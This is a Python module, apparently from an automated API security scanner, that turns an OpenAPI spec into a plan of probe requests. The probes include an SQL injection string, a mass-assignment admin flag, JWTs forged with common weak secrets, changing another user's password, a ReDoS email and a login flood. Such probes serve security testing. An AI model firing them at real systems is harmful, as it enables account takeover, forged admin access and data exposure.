"""从任意 OpenAPI 生成有状态调用和通用安全探针。不读取漏洞编号或靶场名称。"""

from __future__ import annotations

import hmac
import hashlib
import json
import time
from typing import Any
from planner import _exact, _fill_body, body_schema, operations

COMMON_JWT_SECRETS = (
    "secret",
    "password",
    "123456",
    "admin",
    "jwt",
    "token",
    "changeme",
    "default",
    "key",
    "test",
    "random",
    "SECRET_KEY",
    "supersecret",
    "qwerty",
    "dev",
    "pass",
)


def forge_hs256(sub: str, secret: str, ttl: int = 3600) -> str:
    def b64(data: bytes) -> str:
        import base64

        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    now = int(time.time())
    payload = b64(json.dumps({"exp": now + ttl, "iat": now, "sub": sub}, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
    return f"{header}.{payload}.{b64(sig)}"


def _find(ops: list[dict], method: str, *needles: str) -> dict | None:
    method = method.upper()
    for item in ops:
        if item["method"] != method:
            continue
        path = item["path"].lower()
        if all(n.lower() in path for n in needles):
            return item
    return None


def _example_usernames(spec: dict) -> list[str]:
    found: list[str] = []

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            if node.get("name") == "username" and isinstance(node.get("example"), str):
                found.append(node["example"])
            example = node.get("example")
            if isinstance(example, str) and example.isalnum() and 3 <= len(example) <= 32:
                if "name" in example or example in {"admin", "user"}:
                    found.append(example)
            for child in node.values():
                walk(child)
        elif isinstance(node, list):
            for child in node:
                walk(child)

    walk(spec)
    out = []
    for item in found:
        if item not in out:
            out.append(item)
    return out


def build_generic_plan(
    spec: dict,
    *,
    username: str = "specpilot1",
    password: str = "SpecP1pass",
    email: str = "specpilot1@mail.com",
) -> list[dict]:
    ops = operations(spec)
    steps: list[dict] = []
    examples = _example_usernames(spec)
    other_user = next((item for item in examples if item not in {username, "specpilot_admin"}), "name1")
    admin_name = "specpilot_admin"

    createdb = _find(ops, "GET", "createdb") or _exact(ops, "GET", "/createdb")
    register = _find(ops, "POST", "register")
    login = _find(ops, "POST", "login")
    me = _find(ops, "GET", "/me") or _exact(ops, "GET", "/me")
    debug = next((item for item in ops if item["method"] == "GET" and "debug" in item["path"].lower()), None)
    users = _find(ops, "GET", "/users/v1") or _exact(ops, "GET", "/users/v1")
    get_user = next(
        (item for item in ops if item["method"] == "GET" and "{username}" in item["path"] and item["path"].rstrip("/").endswith("{username}")),
        None,
    )
    put_password = next((item for item in ops if item["method"] == "PUT" and item["path"].endswith("/password")), None)
    put_email = next((item for item in ops if item["method"] == "PUT" and item["path"].endswith("/email")), None)
    list_books = _find(ops, "GET", "/books") or _exact(ops, "GET", "/books/v1")
    get_book = next((item for item in ops if item["method"] == "GET" and "{book_title}" in item["path"]), None)
    add_book = _find(ops, "POST", "/books") or _exact(ops, "POST", "/books/v1")

    def add(step: dict) -> None:
        steps.append(step)

    if createdb:
        add({"id": "init_db", "method": "GET", "path": createdb["path"]})
    if register:
        schema = body_schema(register["op"], spec)
        add(
            {
                "id": "register",
                "method": "POST",
                "path": register["path"],
                "json": _fill_body(schema, spec, {"username": username, "password": password, "email": email}),
            }
        )
        extra = _fill_body(schema, spec, {"username": admin_name, "password": password, "email": f"admin-{email}"})
        extra["admin"] = True
        add(
            {
                "id": "register_admin_field",
                "method": "POST",
                "path": register["path"],
                "json": extra,
                "check_mass_assign": "admin",
            }
        )
    if login:
        add(
            {
                "id": "login_admin_field",
                "method": "POST",
                "path": login["path"],
                "json": {"username": admin_name, "password": password},
                "extract": {"admin_token": "auth_token"},
            }
        )
        if me:
            add(
                {
                    "id": "me_admin_field",
                    "method": "GET",
                    "path": me["path"],
                    "headers": {"Authorization": "Bearer $admin_token"},
                }
            )
        add(
            {
                "id": "login",
                "method": "POST",
                "path": login["path"],
                "json": {"username": username, "password": password},
                "extract": {"token": "auth_token"},
            }
        )
        add(
            {
                "id": "login_wrong_password",
                "method": "POST",
                "path": login["path"],
                "json": {"username": username, "password": "wrong-password"},
            }
        )
        add(
            {
                "id": "login_unknown_user",
                "method": "POST",
                "path": login["path"],
                "json": {"username": "no_such_user_zzz", "password": "wrong-password"},
            }
        )
    if me:
        add({"id": "me", "method": "GET", "path": me["path"], "auth": True})
    if users:
        add({"id": "list_users", "method": "GET", "path": users["path"]})
    if debug:
        add({"id": "debug_users", "method": "GET", "path": debug["path"]})
    if get_user:
        payload = "' OR '1'='1"
        add(
            {
                "id": "sqli_user",
                "method": "GET",
                "path": get_user["path"].split("{")[0] + payload,
            }
        )
    if add_book:
        schema = body_schema(add_book["op"], spec)
        add(
            {
                "id": "add_book",
                "method": "POST",
                "path": add_book["path"],
                "auth": True,
                "json": _fill_body(schema, spec, {"book_title": "specpilot-book", "secret": "own-secret"}),
            }
        )
    if list_books:
        add({"id": "list_books", "method": "GET", "path": list_books["path"], "extract_other_book": True})
    if get_book:
        add(
            {
                "id": "get_other_book",
                "method": "GET",
                "path": get_book["path"].replace("{book_title}", "$other_book"),
                "auth": True,
            }
        )
    if put_password:
        add(
            {
                "id": "put_other_password",
                "method": "PUT",
                "path": put_password["path"].replace("{username}", other_user),
                "auth": True,
                "json": {"password": "hacked-by-agent"},
            }
        )
        if login:
            add(
                {
                    "id": "login_other_new_password",
                    "method": "POST",
                    "path": login["path"],
                    "json": {"username": other_user, "password": "hacked-by-agent"},
                }
            )
            add(
                {
                    "id": "login_restore",
                    "method": "POST",
                    "path": login["path"],
                    "json": {"username": username, "password": password},
                    "extract": {"token": "auth_token"},
                }
            )
    if put_email:
        evil = ("a" * 28) + "!" + "@x.co"
        add(
            {
                "id": "email_redos",
                "method": "PUT",
                "path": put_email["path"].replace("{username}", username),
                "auth": True,
                "json": {"email": evil},
            }
        )
    if me:
        for secret in COMMON_JWT_SECRETS:
            token = forge_hs256("admin", secret)
            add(
                {
                    "id": f"jwt_{secret}",
                    "method": "GET",
                    "path": me["path"],
                    "headers": {"Authorization": f"Bearer {token}"},
                    "jwt_probe": secret,
                }
            )
    if login:
        for i in range(12):
            add(
                {
                    "id": f"rate_login_{i}",
                    "method": "POST",
                    "path": login["path"],
                    "json": {"username": f"rate{i}", "password": "x"},
                }
            )
    return steps
